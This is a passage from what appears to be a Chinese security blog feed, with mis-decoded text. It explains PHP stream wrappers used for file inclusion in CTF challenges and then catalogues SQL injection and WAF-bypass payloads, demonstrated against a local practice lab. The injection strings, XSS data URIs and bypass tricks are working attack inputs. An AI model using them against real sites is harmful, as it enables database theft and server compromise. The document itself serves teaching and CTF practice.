title="file://åè®®"></a>file://åè®®</h2><p>file://åè®®ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚</p><p>æ³¨æ„ï¼šè¯¥åè®®çš„è·¯å¾„åªèƒ½è¾“å…¥ç»å¯¹è·¯å¾„ï¼Œè¾“å…¥ç›¸å¯¹è·¯å¾„æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚</p><p>å…ˆè¾“å…¥ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¯ä»¥è¯»åˆ°è¯¥æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚CTFç»å¸¸é‡åˆ°çš„flagï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/2.png" alt="file://è¯»å–txtæ–‡ä»¶"></p><p>è¾“å…¥phpæˆ–JSæ–‡ä»¶ï¼Œfile://åè®®ä¼šæ‰§è¡Œè¯¥PHPæ–‡ä»¶é‡Œçš„ä»£ç è€Œä¸æ˜¯æ˜¾ç¤ºè¯¥å†…å®¹ï¼Œå› è€Œè¯¥åè®®ä¸é€‚ç”¨äºè·å–æ–‡ä»¶å†…å®¹æºä»£ç ï¼ˆè€Œå¸¸ç”¨php://filterä¼ªåè®®ï¼‰ï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/3.png" alt="file://è¯»å–phpæ–‡ä»¶"></p><p><img src="/2019/01/31/PHPä¼ªåè®®/4.png" alt="file://è¯»å–jsæ–‡ä»¶"></p><h2 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php://åè®®"></a>php://åè®®</h2><p>php://è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p><p>ä¸éœ€è¦å¼€å¯allow_url_fopenï¼Œä»…php://inputã€php://stdinã€ php://memoryå’Œphp://tempéœ€è¦å¼€å¯allow_url_includeã€‚</p><h3 id="php-filteråè®®"><a href="#php-filteråè®®" class="headerlink" title="php://filteråè®®"></a>php://filteråè®®</h3><p>php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚åœ¨CTFä¸­ä¸»è¦ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ã€‚ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p>æŸ¥çœ‹ä¹‹å‰çš„test.jsæ–‡ä»¶ä¸PHPæ–‡ä»¶ï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/5.png" alt="php://filterè¯»å–jsæ–‡ä»¶"></p><p><img src="/2019/01/31/PHPä¼ªåè®®/6.png" alt="php://filterè¯»å–phpæ–‡ä»¶"></p><h3 id="php-inputåè®®"><a href="#php-inputåè®®" class="headerlink" title="php://inputåè®®"></a>php://inputåè®®</h3><p>php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨CTFä¸­å¤šç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p><p>ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p><img src="/2019/01/31/PHPä¼ªåè®®/7.png" alt="php://inputå†™å…¥phpinfo"></p><p><img src="/2019/01/31/PHPä¼ªåè®®/8.png" alt="php://inputå†™å…¥system"></p><h2 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data://åè®®"></a>data://åè®®</h2><p>data://å³æ•°æ®ï¼Œåœ¨CTFä¸­ä¸»è¦ç”¨äºå†™å…¥ä»£ç å¹¶åŒ…å«è¯¥ä»£ç åˆ°å½“å‰é¡µé¢ä¸­ã€‚</p><p>å¿…é¡»åŒæ—¶å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p>ä½¿ç”¨å½¢å¼å¦‚ä¸‹ï¼š</p><p>data:text/plain;base64, \<script>alert(â€˜xssâ€™)\</script></p><p>data://text/plain;base64, \<script>alert(â€˜xssâ€™)\</script></p><p>data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</p><p>data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</p><p><img src="/2019/01/31/PHPä¼ªåè®®/9.png" alt="data://åè®®å†™å…¥phpinfo"></p><p><img src="/2019/01/31/PHPä¼ªåè®®/10.png" alt="data://åè®®å†™å…¥jsä»£ç "></p><h2 id="zip-ã€bzip2-ã€zlib-åè®®"><a href="#zip-ã€bzip2-ã€zlib-åè®®" class="headerlink" title="zip://ã€bzip2://ã€zlib://åè®®"></a>zip://ã€bzip2://ã€zlib://åè®®</h2><p>zip://ã€bzip2://ã€zlib://å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åã€‚</p><p>ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><h3 id="zip-åè®®"><a href="#zip-åè®®" class="headerlink" title="zip://åè®®"></a>zip://åè®®</h3><p>zip://å‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>zip:// [å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</p><p>æ–‡ä»¶è·¯å¾„å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ã€‚</p><p>ä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPä»£ç æ–‡ä»¶çš„zipåŒ…ï¼Œåªè¦zip://è®¿é—®è¯¥åè®®å³è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€å°†ä»»æ„æ–‡æœ¬æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œPHPä»£ç æ‰§è¡Œï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/11.png" alt="demo"></p><p>å½“ç„¶å¯ä»¥ä¿®æ”¹ä¸Šä¼ çš„zipæ–‡ä»¶åç¼€åä¸ºå…¶ä»–å¦‚å›¾ç‰‡åç¼€ï¼Œæ ¹æ®ç‰¹å®šæƒ…å†µå¯ç»•è¿‡ä¸€äº›ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„é™åˆ¶ï¼š</p><p><img src="/2019/01/31/PHPä¼ªåè®®/12.png" alt="demo"></p><h3 id="zlib-åè®®"><a href="#zlib-åè®®" class="headerlink" title="zlib://åè®®"></a>zlib://åè®®</h3><p>zlib://å‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>compress.zlib://file</p><p>æ–‡ä»¶æ— ç»å¯¹è·¯å¾„é™åˆ¶ã€‚</p><p><img src="/2019/01/31/PHPä¼ªåè®®/13.png" alt="demo"></p><p><img src="/2019/01/31/PHPä¼ªåè®®/14.png" alt="demo"></p><h3 id="bzip2-åè®®"><a href="#bzip2-åè®®" class="headerlink" title="bzip2://åè®®"></a>bzip2://åè®®</h3><p>bzip2://å‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>compress.bzip2://file</p><p>æ–‡ä»¶æ— ç»å¯¹è·¯å¾„é™åˆ¶ã€‚</p><p>å¯æ˜¯è¿™é‡Œæ€ä¹ˆæµ‹è¯•éƒ½ä¸æˆåŠŸï¼Œé€šè¿‡phpinfoæŸ¥çœ‹bzip2://æ˜¯enableä¸”æ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶è·¯å¾„éƒ½è¿›è¡Œå°è¯•ï¼ŒPHPç‰ˆæœ¬ä¹Ÿæ¢äº†å‡ ä¸ªï¼Œè¿˜æ˜¯æ— æ³•æ˜¾ç¤ºphpinfoä¿¡æ¯ï¼Œå“ªä½çŸ¥é“åŸå› çš„å¤§ä½¬è¯·æŒ‡ç‚¹ä¸€ä¸‹ : )</p><h2 id="phar-åè®®"><a href="#phar-åè®®" class="headerlink" title="phar://åè®®"></a>phar://åè®®</h2><p>phar://å³PHPå½’æ¡£ï¼Œå¸¸ç”¨äºè§£æpharæ–‡ä»¶å†…å®¹ï¼Œæœ€è¿‘çš„CTFä¸­å¤šç”¨äºpharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚ååºåˆ—åŒ–æ¼æ´å…·ä½“çš„åˆ©ç”¨å¯å‚è€ƒ<a href="https://blog.csdn.net/SKI_12/article/details/85551194" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/85551194</a></p><p><img src="/2019/01/31/PHPä¼ªåè®®/15.png" alt="demo"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åŸºæœ¬æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬æ¦‚å¿µ&quot;&gt;&lt;/a&gt;åŸºæœ¬æ¦‚å¿µ&lt;/h2&gt;&lt;p&gt;PHPä¼ªåè®®åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨åˆ°ï¼Œè¿™é‡Œå†™ä¸ªç®€å•çš„Demoå°ç»“ä¸€ä¸‹ï¼Œä¸»è¦å¯¹file://ã€php://filterã€php:/
      
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§Webæ¼æ´ç±»å‹æ€»ç»“</title>
    <link href="https://Mi1k7ea.github.com/2019/01/30/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/"/>
    <id>https://Mi1k7ea.github.com/2019/01/30/å¸¸è§Webæ¼æ´ç±»å‹/</id>
    <published>2019-01-30T14:47:15.000Z</published>
    <updated>2019-02-08T14:36:33.701Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œå°ç»“ä¸€ä¸‹å¸¸è§çš„Webæ¼æ´ç±»å‹ï¼Œå¾…å®Œå–„ã€‚</p><h2 id="SQLæ³¨å…¥ä¸SQLç›²æ³¨"><a href="#SQLæ³¨å…¥ä¸SQLç›²æ³¨" class="headerlink" title="SQLæ³¨å…¥ä¸SQLç›²æ³¨"></a>SQLæ³¨å…¥ä¸SQLç›²æ³¨</h2><h3 id="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"><a href="#ä¸€ã€åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ä¸€ã€åŸºæœ¬æ¦‚å¿µ"></a>ä¸€ã€åŸºæœ¬æ¦‚å¿µ</h3><p><strong>æ¼æ´å®šä¹‰</strong></p><p>ã€€ã€€SQLæ³¨å…¥æ¼æ´ä½œä¸ºOWASP TOP10ä¸­é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå¯è§å…¶å®‰å…¨æ€§çš„å±å®³æœ‰å¤šå¤§ã€‚ç®€å•åœ°è¯´ï¼ŒSQLæ³¨å…¥å°±æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„å…·æœ‰SQLè¯­æ³•çš„è¯­å¥ï¼Œç»•åˆ°æ•°æ®åº“ä¸­è¿›è€Œæ‰§è¡Œç›¸åº”çš„æ“ä½œçš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨æ½œåœ¨çš„æ•°æ®åº“æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><p><strong>æˆå› </strong></p><p>ã€€ã€€é’ˆå¯¹SQLæ³¨å…¥çš„æ”»å‡»è¡Œä¸ºå¯æè¿°ä¸ºé€šè¿‡åœ¨ç”¨æˆ·å¯æ§å‚æ•°ä¸­æ³¨å…¥SQLè¯­æ³•ï¼Œç ´ååŸæœ‰SQLç»“æ„ï¼Œè¾¾åˆ°ç¼–å†™ç¨‹åºæ—¶æ„æ–™ä¹‹å¤–ç»“æœçš„æ”»å‡»è¡Œä¸ºã€‚å…¶æˆå› å¯ä»¥å½’ç»“ä¸ºä»¥ä¸‹ä¸¤ä¸ªåŸå› å åŠ é€ æˆçš„ï¼š</p><ol><li>ç¨‹åºç¼–å†™è€…åœ¨å¤„ç†åº”ç”¨ç¨‹åºå’Œæ•°æ®åº“äº¤äº’æ—¶ï¼Œä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ„é€ SQLè¯­å¥</li><li>æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤ä¾¿å°†å‚æ•°å†…å®¹æ‹¼æ¥è¿›å…¥åˆ°SQLè¯­å¥ä¸­</li></ol><p><strong>æ”»å‡»æ–¹å¼</strong></p><p>ã€€ã€€SQLæ³¨å…¥çš„æ”»å‡»æ–¹å¼æ ¹æ®åº”ç”¨ç¨‹åºå¤„ç†æ•°æ®åº“è¿”å›å†…å®¹çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºåŸºäºæŠ¥é”™çš„æ³¨å…¥ã€åŸºäºå¸ƒå°”çš„æ³¨å…¥å’Œç›²æ³¨ã€‚</p><p>â€‹    åŸºäºæŠ¥é”™çš„æ³¨å…¥ï¼šæ•°æ®åº“æŸ¥è¯¢è¿”å›ç»“æœå¹¶æ²¡æœ‰åœ¨é¡µé¢ä¸­æ˜¾ç¤ºï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºå°†æ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åˆ°äº†é¡µé¢ä¸­ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æ„é€ æ•°æ®åº“æŠ¥é”™è¯­å¥ï¼Œä»æŠ¥é”™ä¿¡æ¯ä¸­è·å–æƒ³è¦è·å¾—çš„å†…å®¹ï¼Œå¦‚æ³¨å…¥å„ç§ç¬¦å·ä»¥åŠç»„åˆï¼š â€˜  â€œ  (  %</p><p>â€‹    åŸºäºå¸ƒå°”çš„æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨å½“å‰ç•Œé¢å†…å®¹ä¸­è·å–æƒ³è¦è·å¾—çš„å†…å®¹ï¼Œå¦‚æ³¨å…¥ï¼š1â€™ and â€˜1â€™=â€™1å’Œ1â€™ and â€˜1â€™=â€™2 ç›¸å½“äº 1â€™ and â€˜1å’Œ1â€™ and â€˜0ï¼Œå½“è¿”å›çš„ç»“æœä¸åŒæ—¶å³æœ‰æ¼æ´</p><p>ã€€ã€€ç›²æ³¨ï¼šæ•°æ®åº“æŸ¥è¯¢ç»“æœæ— æ³•ä»ç›´è§‚é¡µé¢ä¸­è·å–ï¼Œæ”»å‡»è€…é€šè¿‡ä½¿ç”¨æ•°æ®åº“é€»è¾‘æˆ–ä½¿æ•°æ®åº“åº“æ‰§è¡Œå»¶æ—¶ç­‰æ–¹æ³•è·å–æƒ³è¦è·å¾—çš„å†…å®¹</p><p>â€‹    åˆ¤æ–­ç›²æ³¨çš„å¸¸è§ç”¨æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1â€™ and 1=1 <span class="comment">#</span></span><br><span class="line">1â€™ and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>â€‹    åˆ¤æ–­è¿™ä¸¤ç§ä¸åŒçš„è¾“å…¥æ˜¯å¦æœ‰ä¸ä¸€æ ·çš„æ˜¾ç¤ºï¼Œå¦‚æœä¸€ä¸ªæ­£å¸¸ä¸€ä¸ªé€šç”¨çš„é”™è¯¯æç¤ºæˆ–è€…å•¥ä¹Ÿä¸æ˜¾ç¤ºï¼Œåˆ™å‡ ä¹å¯ä»¥ç¡®å®šæ˜¯å«æœ‰SQLæ³¨å…¥æ¼æ´çš„ã€‚</p><p>â€‹    åŸºäºå¸ƒå°”çš„æ³¨å…¥ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€‹    åŸºäºæŠ¥é”™çš„æ³¨å…¥ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> email_id <span class="keyword">from</span> emails <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">5</span>),<span class="number">0x2a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> x<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>â€‹    ç›²æ³¨ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (<span class="keyword">select</span> <span class="keyword">substr</span>(email_id,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> emails <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">3</span>) &gt; <span class="string">'a'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•°</strong></p><p>â€‹    user()è¿”å›å½“å‰æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„ç”¨æˆ·ï¼›</p><p>â€‹    database()è¿”å›å½“å‰æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„æ•°æ®åº“ï¼›</p><p>â€‹    version()è¿”å›å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ï¼›</p><p>â€‹    concatæˆ–è€…concat-wså‡½æ•°å¯ä»¥å°†è¿™äº›å‡½æ•°è¿›è¡Œç»„åˆä½¿ç”¨å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚concatå‡½æ•°ä¸­ï¼Œå°†å…¶ä¸­çš„å‚æ•°ç›´æ¥è¿æ¥èµ·æ¥äº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²ã€‚è€Œåœ¨concat_wså‡½æ•°ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨äºä½œä¸ºåˆ†éš”ç¬¦å°†åé¢å„ä¸ªå‚æ•°çš„å†…å®¹åˆ†éš”å¼€æ¥å†è¿›è¡Œç›¸åº”çš„è¿æ¥äº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²ã€‚ä»¥å…¶å¸¸ç”¨çš„ä¾‹å­ä¸ºä¾‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(char(32,58,32),user(),database(),version())</span><br></pre></td></tr></table></figure><p>â€‹    å…¶ä¸­char()å‡½æ•°ä¸ºå°†é‡Œé¢çš„å‚æ•°è½¬åŒ–ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œå…¶ä¸­32ä¸ºç©ºæ ¼ï¼Œ58ä¸ºå†’å·(:)ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼å¯ä»¥ç»•è¿‡ä¸€äº›ç®€å•çš„è¿‡æ»¤æœºåˆ¶ã€‚</p><p><strong>å‡ ä¸ªå¸¸ç”¨çš„å…¨å±€å‡½æ•°</strong></p><p>â€‹    @@datadir  @@hostname  @@VERSION  @@version_compile_os</p><p><strong>å±å®³</strong></p><p>ã€€ã€€æ”»å‡»è€…åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è·å–æ•°æ®åº“ä¸­çš„å¤šç§ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼šç®¡ç†å‘˜åå°å¯†ç ï¼‰ï¼Œä»è€Œè„±å–æ•°æ®åº“ä¸­å†…å®¹ï¼ˆè„±åº“ï¼‰ã€‚åœ¨ç‰¹åˆ«æƒ…å†µä¸‹è¿˜å¯ä»¥ä¿®æ”¹æ•°æ®åº“å†…å®¹æˆ–è€…æ’å…¥å†…å®¹åˆ°æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“æƒé™åˆ†é…å­˜åœ¨é—®é¢˜ï¼Œæˆ–è€…æ•°æ®åº“æœ¬èº«å­˜åœ¨ç¼ºé™·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡SQLæ³¨å…¥æ¼æ´ç›´æ¥è·å–webshellæˆ–è€…æœåŠ¡å™¨ç³»ç»Ÿæƒé™ã€‚</p><h3 id="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"><a href="#äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•" class="headerlink" title="äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•"></a>äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•</h3><p><strong>1ã€å¤§å°å†™ç»•è¿‡</strong></p><p>â€‹    å¦‚ï¼š?id=1â€™ uNiOn SElecT * FrOm users #</p><p><strong>2ã€ç®€å•ç¼–ç ç»•è¿‡</strong></p><p>â€‹    å¦‚URLç¼–ç ã€åŒé‡URLç¼–ç ã€Hexç¼–ç ã€Unicodeç¼–ç ç­‰ã€‚</p><p>â€‹    ?id=1%252f%252a*/UNION%252f%252a /SELECT</p><p>â€‹    id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4â€¦</p><p>â€‹    ?id=10%D6â€˜%20AND%201=2%23</p><p>â€‹    SELECT â€˜Ã„â€™=â€™Aâ€™; #1    </p><p><strong>3ã€æ³¨é‡Šç»•è¿‡</strong></p><p>â€‹    å¦‚?id=1 uni/<strong>/on sele/</strong>/ct 1,2,3 # </p><p><strong>4ã€åˆ†éš”é‡å†™ç»•è¿‡</strong></p><p>â€‹    é€‚ç”¨äºWAFé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹æ‰€æœ‰çš„æ•æ„Ÿå­—çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šåˆ†å¼€æ•æ„Ÿå­—ï¼Œå¦‚?id=1 un//ion sel//ect 1,2,3 #ï¼›è‡³äºé‡å†™ç»•è¿‡ï¼Œé€‚ç”¨äºWAFè¿‡æ»¤äº†ä¸€æ¬¡çš„æƒ…å†µï¼Œå¦‚uniuniononï¼Œæœ‰æ—¶å€™å¯èƒ½è¿˜æœ‰å¤šæ¬¡è¿‡æ»¤çš„æƒ…å†µï¼Œè¿™æ—¶å¤šæ¬¡å°è¯•ä¹Ÿå¯ä»¥ã€‚</p><p><strong>5ã€HTTPå‚æ•°æ±¡æŸ“(HPP)ï¼š</strong></p><p>â€‹    å¦‚?id=1 union select 1,2,3 from users where id=1 # </p><p>â€‹    è¿™æ—¶å¯ä»¥æ”¹ä¸º?id=1 union select 1&amp;id=2,3 from users where id=1 # </p><p>â€‹    æ¬¡æ•°&amp;id=ä¼šåœ¨æŸ¥è¯¢æ—¶å˜æˆé€—å·ï¼Œå…·ä½“ç»†èŠ‚å–å†³äº WAF ï¼›</p><p>â€‹    è¿™ä¸ªä¾‹å­ä¹ŸåŒç†ï¼š?id=1/<em>/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=</em>/users # </p><p>â€‹    å¦‚æœæœåŠ¡å™¨ä»£ç ä¸ºï¼š select <em> from table where a=â€.$_GET[â€˜aâ€™].â€ and b=â€.$_GET[â€˜bâ€™].â€ limit â€œ.$_GET[â€˜câ€™]; é‚£ä¹ˆå¯ä»¥æ„é€ è¿™æ ·çš„æ³¨å…¥è¯­å¥ï¼š ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # æœ€ç»ˆè§£æä¸ºï¼š select from table where a=1 union/ and b=/select 1,pass/limit </em>/from users # å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ–¹å¼æ¯”è¾ƒé€‚åˆç™½ç›’æµ‹è¯•ã€‚</p><p><strong>6ã€ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ or /and ç»•è¿‡</strong></p><p>â€‹    å¦‚?id=1 or 0x50=0x50 </p><p>â€‹    ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74ï¼Œå…¶ä¸­select pwd from users limit 1,1æ˜¯ä» users è¡¨é‡ŒæŸ¥è¯¢ pwd å­—æ®µçš„ç¬¬ä¸€æ¡è®°å½•ï¼Œ ç„¶å mid()å°±æ˜¯å–è¯¥è®°å½•çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ lower()æŠŠå­—ç¬¦è½¬æ¢ä¸ºå°å†™ï¼Œ  ascii æŠŠ è¯¥å­—ç¬¦è½¬æ¢æˆ ascii ç ï¼Œæœ€ååˆ¤æ–­ç­‰ä¸ç­‰äº 74ã€‚</p><p><strong>7ã€æ¯”è¾ƒæ“ä½œç¬¦æ›¿æ¢</strong></p><p>â€‹    æ¯”è¾ƒæ“ä½œç¬¦å¦‚!=ã€&lt;&gt;ã€&lt;ã€&gt;éƒ½å¯ä»¥ç”¨æ¥æ›¿æ¢=æ¥ç»•è¿‡ã€‚</p><p><strong>8ã€åŒåŠŸèƒ½å‡½æ•°æ›¿æ¢</strong></p><p>â€‹    substring()å¯ä»¥ç”¨mid()ã€substr()è¿™äº›å‡½æ•°æ¥æ›¿æ¢ï¼Œéƒ½æ˜¯ç”¨æ¥å–å­—ç¬¦ä¸²çš„æŸä¸€ä½å­—ç¬¦çš„ï¼›</p><p>â€‹    ascii()ç¼–ç å¯ä»¥ç”¨ hex()ã€bin()ï¼Œå³åå…­è¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç¼–ç æ›¿æ¢ï¼›</p><p>â€‹    åœ¨ä½¿ç”¨åœ¨åŸºäºå»¶æ—¶çš„ç›²æ³¨ä¸­benchmark()å’Œsleep()å¯ä»¥ç›¸äº’æ›¿æ¢ï¼›</p><p>â€‹    group_concat ã€ concat ã€concat_ws ä¸‰è€…å¯ä»¥äº’ç›¸æ›¿æ¢ï¼›</p><p>â€‹    è¿˜æœ‰ä¸€ç§æ–°çš„æ–¹æ³• ï¼Œ3æ¡è¯­å¥åˆ†åˆ«å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substring((<span class="keyword">select</span> â€˜<span class="keyword">password</span>â€™),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">substr</span>((<span class="keyword">select</span> â€˜<span class="keyword">password</span>â€™),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="keyword">mid</span>((<span class="keyword">select</span> â€˜<span class="keyword">password</span>â€™),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br></pre></td></tr></table></figure><p>â€‹    éƒ½æ˜¯ä» password é‡Œåˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å€¼ï¼Œå¯ä»¥ç”¨ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strcmp(left(â€˜passwordâ€™,1), 0x69) = 1</span><br><span class="line">strcmp(left(â€˜passwordâ€™,1), 0x70) = 0</span><br><span class="line">strcmp(left(â€˜passwordâ€™,1), 0x71) = -1</span><br></pre></td></tr></table></figure><p>â€‹    æ›¿æ¢ï¼Œleft ç”¨æ¥å–å­—ç¬¦ä¸²å·¦èµ· 1 ä½çš„å€¼ï¼Œstrcmp ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå€¼ï¼Œå¦‚æœæ¯”è¾ƒç»“æœç›¸ç­‰å°±ä¸º 0ï¼Œå·¦è¾¹å°çš„è¯å°±ä¸º-1ï¼Œå¦åˆ™ä¸º 1ã€‚</p><p><strong>9ã€ç›²æ³¨æ— éœ€orå’Œand</strong></p><p>â€‹    ä¾‹å¥ï¼šindex.php?id=1</p><p>â€‹    å½“andå’Œorè¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥å°† 1ä¿®æ”¹ä¸ºæ˜¯é€šè¿‡è¯­å¥ç”Ÿæˆçš„ï¼Œ index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123ï¼Œ123 